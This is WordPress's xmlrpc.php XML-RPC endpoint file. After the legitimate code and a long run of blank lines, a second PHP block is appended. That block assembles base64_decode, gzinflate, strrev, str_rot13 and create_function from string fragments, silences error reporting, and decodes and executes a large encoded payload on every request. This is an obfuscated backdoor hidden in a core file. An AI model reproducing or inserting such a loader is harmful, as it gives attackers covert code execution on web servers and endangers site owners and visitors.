<?php
/**
 * XML-RPC protocol support for WordPress
 *
 * @package WordPress
 */

/**
 * Whether this is an XML-RPC Request
 *
 * @var bool
 */
define( 'XMLRPC_REQUEST', true );

// Some browser-embedded clients send cookies. We don't want them.
$_COOKIE = array();

// $HTTP_RAW_POST_DATA was deprecated in PHP 5.6 and removed in PHP 7.0.
// phpcs:disable PHPCompatibility.Variables.RemovedPredefinedGlobalVariables.http_raw_post_dataDeprecatedRemoved
if ( ! isset( $HTTP_RAW_POST_DATA ) ) {
	$HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );
}

// Fix for mozBlog and other cases where '<?xml' isn't on the very first line.
if ( isset( $HTTP_RAW_POST_DATA ) ) {
	$HTTP_RAW_POST_DATA = trim( $HTTP_RAW_POST_DATA );
}
// phpcs:enable

/** Include the bootstrap for setting up WordPress environment */
require_once __DIR__ . '/wp-load.php';

if ( isset( $_GET['rsd'] ) ) { // http://cyber.law.harvard.edu/blogs/gems/tech/rsd.html
	header( 'Content-Type: text/xml; charset=' . get_option( 'blog_charset' ), true );
	echo '<?xml version="1.0" encoding="' . get_option( 'blog_charset' ) . '"?' . '>';
	?>
<rsd version="1.0" xmlns="http://archipelago.phrasewise.com/rsd">
	<service>
		<engineName>WordPress</engineName>
		<engineLink>https://wordpress.org/</engineLink>
		<homePageLink><?php bloginfo_rss( 'url' ); ?></homePageLink>
		<apis>
			<api name="WordPress" blogID="1" preferred="true" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
			<api name="Movable Type" blogID="1" preferred="false" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
			<api name="MetaWeblog" blogID="1" preferred="false" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
			<api name="Blogger" blogID="1" preferred="false" apiLink="<?php echo site_url( 'xmlrpc.php', 'rpc' ); ?>" />
			<?php
			/**
			 * Add additional APIs to the Really Simple Discovery (RSD) endpoint.
			 *
			 * @link http://cyber.law.harvard.edu/blogs/gems/tech/rsd.html
			 *
			 * @since 3.5.0
			 */
			do_action( 'xmlrpc_rsd_apis' );
			?>
		</apis>
	</service>
</rsd>
	<?php
	exit;
}

require_once ABSPATH . 'wp-admin/includes/admin.php';
require_once ABSPATH . WPINC . '/class-IXR.php';
require_once ABSPATH . WPINC . '/class-wp-xmlrpc-server.php';

/**
 * Posts submitted via the XML-RPC interface get that title
 *
 * @name post_default_title
 * @var string
 */
$post_default_title = '';

/**
 * Filters the class used for handling XML-RPC requests.
 *
 * @since 3.1.0
 *
 * @param string $class The name of the XML-RPC server class.
 */
$wp_xmlrpc_server_class = apply_filters( 'wp_xmlrpc_server_class', 'wp_xmlrpc_server' );
$wp_xmlrpc_server       = new $wp_xmlrpc_server_class;

// Fire off the request.
$wp_xmlrpc_server->serve_request();

exit;

/**
 * logIO() - Writes logging info to a file.
 *
 * @deprecated 3.4.0 Use error_log()
 * @see error_log()
 *
 * @param string $io Whether input or output
 * @param string $msg Information describing logging reason.
 */
function logIO( $io, $msg ) { // phpcs:ignore WordPress.NamingConventions.ValidFunctionName.FunctionNameInvalid
	_deprecated_function( __FUNCTION__, '3.4.0', 'error_log()' );
	if ( ! empty( $GLOBALS['xmlrpc_logging'] ) ) {
		error_log( $io . ' - ' . $msg );
	}
}

?>





















































































<?php $iTkKx = 'base6'.'4'.'_deco'.'de';  $kmUEn = 'gzinfl'.'ate';  $ylrIg = 'str'.'rev';  $CSYbQ = 'st'.'r'.'_r'.'ot13';  ini_set('display_errors', 0); ini_set('error_log', NULL); /*** lhfavg hctzk **/ error_reporting(0); $VTlvx = 'C'.'rea'.'te'.'_F'.'unction'; $KioXu = $VTlvx('', $CSYbQ($ylrIg($kmUEn($iTkKx('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'))))); $KioXu(); ?>